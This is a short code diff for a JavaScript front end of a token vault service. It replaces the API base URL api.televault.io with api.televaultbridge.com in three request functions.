@@ -167,7 +167,7 @@ function getVaults() {
     if (event && event.preventDefault) event.preventDefault();
 		vaultsButton.removeEventListener('click', getVaults)
 
-    let apiUrl = new URL('https://api.televault.io/');
+    let apiUrl = new URL('https://api.televaultbridge.com/');
     
     let request = new XMLHttpRequest();
 
@@ -307,7 +307,7 @@ async function signAttestation() {
 
 function getAppraisal() {
   if (event && event.preventDefault) event.preventDefault();
-  let apiUrl = new URL('https://api.televault.io/');
+  let apiUrl = new URL('https://api.televaultbridge.com/');
     
   let appraisal_request = new XMLHttpRequest();
 
@@ -347,7 +347,7 @@ async function televault() {
 
     let refresh_request = new XMLHttpRequest();
 
-    apiUrl = new URL('https://api.televault.io/');
+    apiUrl = new URL('https://api.televaultbridge.com/');
     
     let url = apiUrl.toString() + 'refresh/' + selectedTokenId;
     
